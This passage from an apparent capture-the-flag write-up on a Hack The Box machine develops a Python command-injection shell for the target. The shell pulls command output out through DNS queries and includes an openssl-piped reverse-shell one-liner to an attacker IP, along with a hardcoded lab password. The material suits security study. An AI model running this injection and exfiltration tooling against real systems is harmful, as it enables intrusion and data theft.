 56         command = f'''& (FOR /F "tokens=1-26" %a IN ('{args}') DO ( nslookup "Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX" 10.10.14.14 ))'''
 57         self.send_post(command)

```

### Double Replies

What I have now kind of works, but it’s printing everything twice:

```

ethereal> whoami
etherealalan
etherealalan
ethereal> dir \
Volume in drive C has no label.
Volume in drive C has no label.
Volume Serial Number is FAD9-1FD5
Volume Serial Number is FAD9-1FD5
Directory of c:
Directory of c:
07/07/2018 09:57 PM <DIR> Audit
07/07/2018 09:57 PM <DIR> Audit
06/30/2018 10:10 PM <DIR> inetpub
06/30/2018 10:10 PM <DIR> inetpub
06/26/2018 05:51 AM <DIR> Program Files
06/26/2018 05:51 AM <DIR> Program Files
07/16/2018 08:55 PM <DIR> Program Files (x86)
07/16/2018 08:55 PM <DIR> Program Files (x86)
07/05/2018 09:38 AM <DIR> Users
07/05/2018 09:38 AM <DIR> Users
07/01/2018 09:57 PM <DIR> Windows
07/01/2018 09:57 PM <DIR> Windows
0 File(s) 0 bytes
0 File(s) 0 bytes
6 Dir(s) 15,415,119,872 bytes free
6 Dir(s) 15,415,119,872 bytes free

```

If I watch in `tcpdump`, I’ll see that each query is coming in multiple times. Here’s the line `06/30/2018 10:10 PM <DIR> inetpub` in 5 queries:

```

22:26:08.157743 IP ethereal.htb.63609 > kali.domain: 1+ PTR? 14.14.10.10.in-addr.arpa. (42)
22:26:10.155284 IP ethereal.htb.56936 > kali.domain: 2+ A? Q06/30/2018X.Q10:10X.QPMX.Q<DIR>X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                               
22:26:12.155170 IP ethereal.htb.56937 > kali.domain: 3+ AAAA? Q06/30/2018X.Q10:10X.QPMX.Q<DIR>X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                            
22:26:14.155072 IP ethereal.htb.56938 > kali.domain: 4+ A? Q06/30/2018X.Q10:10X.QPMX.Q<DIR>X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)                                               
22:26:16.856501 IP ethereal.htb.56939 > kali.domain: 5+ AAAA? Q06/30/2018X.Q10:10X.QPMX.Q<DIR>X.QinetpubX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX.QX. (124)

```

I suspect that’s because it doesn’t get an answer, so it tries to ask again. I’ll update the DNS listener to send a response for each domain with the answer “127.0.0.1”:

```

 23     def parse_packet(self, p):
 24         if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
 25             domain = p.getlayer(DNS).qd.qname.decode('utf-8')
 26             print(domain[1:-2].replace('X.Q',' ').strip())
 27             reply = IP(dst=p[IP].src)/UDP(dport=p[UDP].sport, sport=53)/DNS(id=p[DNS].id,
 28                     ancount=1, an=DNSRR(rrname=p[DNSQR].qname, rdata='127.0.0.1')/DNSRR(rrname=domain,
 29                     rdata='127.0.0.1'))
 30             send(reply, verbose=0, iface=self.interface)

```

That eliminates the doubles, and reduces the number of DNS packets from five to three, and speeds up the process.

## Improvements

### Error Checking

Sometimes I would walk away from my computer, and the state tokens would go stale. That causes a 500 response to come back when I sent a POST. I could just kill the shell and re-open it, but I’d rather have it just recognize the issue and re-initiate. To do this, I’ll move much of the stuff from `__init__()` to a `do_login()` function (and call it from `__init__()`), and then add a check on the response when I make a POST. If it comes back 500 immediately (using a timer to differentiate from a call that eventually times out to 500 while running a lot of DNS), I’ll call `do_login`. Having the Login function start with `do_` means that I can refresh my login any time by just entering `login` from the shell command line.

My `send_post` now looks like this:

```

 64     def send_post(self, search):
 65         data = {'__VIEWSTATE': self.view_state,
 66                 '__VIEWSTATEGENERATOR': self.view_state_gen,
 67                 '__EVENTVALIDATION': self.event_val,
 68                 'search': search,
 69                 'ctl02': ''}
 70         try:
 71             start = time.time()
 72             resp = requests.post('http://ethereal.htb:8080/',
 73                              proxies=self.proxy,
 74                              data = data,
 75                              auth = self.auth,
 76                              timeout=120)
 77             if resp.status_code == 500 and time.time - start < 30:
 78                 print("[-] Unable to connect to Ethereal\n[*] Running login")
 79                 self.do_login()
 80                 print("[*] Try running the command again.")
 81         except requests.exceptions.Timeout:
 82             pass

```

`do_login` looks like:

```

 54     def do_login(self, args=''):
 55         print("[*] Logging in and fetching state information.")
 56         resp = requests.get('http://ethereal.htb:8080/', auth=self.auth, proxies=self.proxy)
 57         soup = BeautifulSoup(resp.text, 'html.parser')
 58         self.view_state = soup.find("input", id="__VIEWSTATE").get('value')
 59         self.view_state_gen = soup.find("input", id="__VIEWSTATEGENERATOR").get('value')
 60         self.event_val = soup.find("input", id="__EVENTVALIDATION").get('value')
 61         print("[+] State information received.")

```

### Clean Exit

Right now, when I want to exit the shell, I have to ctrl-c twice, to kill the terminal and the DNS thread. And it dies with exceptions all over the screen.

There’s not a really clean way that I know of to kill a thread like this from somewhere else in the code. But I came up with a kludge.

The command running in the DNS thread is:

```

sniff(iface=self.interface, filter=f"src host {self.target_ip} and udp port 53",prn=self.parse_packet)

```

`sniff` actually has a parameter you can pass it, `stop_filter`. It is a function that is passed each packet, and, if it returns True, will stop `sniff`. So I’ll add one that if I get a query for a pre-defined domain, I’ll exit:

```

 12 kill_domain = "0xdf.0xdf."
...
 23     def run(self):
 24         sniff(iface=self.interface, filter=f"src host {self.target_ip} and udp port 53",
 25                 prn=self.parse_packet, stop_filter=lambda p: p.haslayer(DNS) and
 26                 p.getlayer(DNS).qd.qname.decode('utf-8') == kill_domain)

```

Then I’ll add a `do_exit` function that gets Ethereal to send a query for that domain, and then exits:

```

 79     def do_exit(self, args):
 80         self.send_post(f'& nslookup {kill_domain} 10.10.14.14')
 81         sys.exit()

```

I’ll add a check in `parse_packet`, as the `prn` gets called first, to not print this domain:

```

 31             domain = p.getlayer(DNS).qd.qname.decode('utf-8')
 32             if domain == kill_domain: return

```

It works:

```

root@kali# ./ethereal_shell.py
ethereal> whoami
etherealalan
ethereal> exit
root@kali#

```

I can also add a wrapper around my `cmdloop` to catch ctrl-c:

```

 94 try:
 95     term.cmdloop()
 96 except KeyboardInterrupt:
 97     term.do_exit('')

```

### quiet Command

There are a bunch of cases where I need to send a command that I don’t need output for. And there are cases where the for loop into `nslookup` is causing issues. For this reason, I’ll create a `quiet` command. This will take a command and just run it via the injection without the exfil of the response. To add a command in a Cmd terminal, I just create a function `do_[cmd_name]`:

```

    def do_quiet(self, args):
        command = f'& ( {args} )'
        self.send_post(command)

```

To call it, I can now just run:

```

ethereal> quiet start cmd /c "c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"

```

### Adding Messages

I like to have a system that tells me what it’s doing. I’ll add in status messages throughout the shell. Now, for example, when I start the shell, it tells me what’s going on when I am waiting for startup:

```

root@kali# ./ethereal_shell.py 
[*] Starting DNS Sniffer on tun0 for target 10.10.10.106.
[*] Logging in and fetching state information.
[+] State information received.
ethereal>

```

Or exiting:

```

ethereal> exit
[*] Sending kill request.
[*] Received kill packet. Shutting down sniffer thread.

```

## Full Code

The final code is below, and I’ll post it on [my scripts git repo](https://gitlab.com/0xdf/ctfscripts).

```

  1 #!/usr/bin/env python3
  2 
  3 import requests
  4 import sys
  5 import time
  6 from bs4 import BeautifulSoup
  7 from cmd import Cmd
  8 from requests.auth import HTTPBasicAuth
  9 from scapy.all import *
 10 from threading import Thread
 11 
 12 
 13 kill_domain = "0xdf.0xdf."
 14 
 15 
 16 class dns_sniff(Thread):
 17 
 18     def __init__(self, interface='tun0', target_ip='10.10.10.106'):
 19         super().__init__()
 20         self.interface = interface
 21         self.target_ip = target_ip
 22 
 23 
 24     def run(self):
 25         print(f"[*] Starting DNS Sniffer on {self.interface} for target {self.target_ip}.")
 26         sniff(iface=self.interface, filter=f"src host {self.target_ip} and udp port 53",
 27                 prn=self.parse_packet, stop_filter=lambda p: p.haslayer(DNS) and
 28                 p.getlayer(DNS).qd.qname.decode('utf-8') == kill_domain)
 29         print(f"[*] Received kill packet. Shutting down sniffer thread.")
 30 
 31 
 32     def parse_packet(self, p):
 33         if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
 34             domain = p.getlayer(DNS).qd.qname.decode('utf-8')
 35             if domain == kill_domain: return
 36             print(domain[1:-2].replace('X.Q',' ').strip())
 37             reply = IP(dst=p[IP].src)/UDP(dport=p[UDP].sport, sport=53)/DNS(id=p[DNS].id,
 38                     ancount=1, an=DNSRR(rrname=p[DNSQR].qname, rdata='127.0.0.1')/DNSRR(rrname=domain,
 39                     rdata='127.0.0.1'))
 40             send(reply, verbose=0, iface=self.interface)
 41 
 42 class Terminal(Cmd):
 43     prompt = "ethereal> "
 44 
 45 
 46     def __init__(self, proxy=None):
 47         super().__init__()
 48         self.proxy = proxy or {}
 49         self.auth = HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
 50         self.do_login()
 51         self.fail_count = 0
 52 
 53 
 54     def do_login(self, args=''):
 55         print("[*] Logging in and fetching state information.")
 56         resp = requests.get('http://ethereal.htb:8080/', auth=self.auth, proxies=self.proxy)
 57         soup = BeautifulSoup(resp.text, 'html.parser')
 58         self.view_state = soup.find("input", id="__VIEWSTATE").get('value')
 59         self.view_state_gen = soup.find("input", id="__VIEWSTATEGENERATOR").get('value')
 60         self.event_val = soup.find("input", id="__EVENTVALIDATION").get('value')
 61         print("[+] State information received.")
 62 
 63 
 64     def send_post(self, search):
 65         data = {'__VIEWSTATE': self.view_state,
 66                 '__VIEWSTATEGENERATOR': self.view_state_gen,
 67                 '__EVENTVALIDATION': self.event_val,
 68                 'search': search,
 69                 'ctl02': ''}
 70         try:
 71             start = time.time()
 72             resp = requests.post('http://ethereal.htb:8080/',
 73                              proxies=self.proxy,
 74                              data = data,
 75                              auth = self.auth,
 76                              timeout=120)
 77             if resp.status_code == 500 and time.time() - start < 30:
 78                 print("[-] Unable to connect to Ethereal\n[*] Running login")
 79                 self.do_login()
 80                 print("[*] Try running the command again.")
 81         except requests.exceptions.Timeout:
 82             pass
 83 
 84 
 85     def do_exit(self, args=''):
 86         print("[*] Sending kill request.")
 87         self.send_post(f'& nslookup {kill_domain} 10.10.14.14')
 88         sys.exit()
 89 
 90 
 91     def default(self, args):
 92         command = f'''& (FOR /F "tokens=1-26" %a IN ('{args}') DO ( nslookup "Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX" 10.10.14.14 ))'''
 93         self.send_post(command)
 94 
 95 
 96     def do_quiet(self, args):
 97         command = f'& ( {args} )'
 98         self.send_post(command)
 99 
100 
101 #dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
102 dns = dns_sniff()
103 dns.start()
104 
105 term = Terminal(proxy={"http": "http://127.0.0.1:8080"})
106 try:
107     term.cmdloop()
108 except KeyboardInterrupt:
109     term.do_exit()

```

[« Password Box Brute](/2019/03/09/htb-ethereal-pbox.html)[COR Profilers »](/2019/03/15/htb-ethereal-cor.html)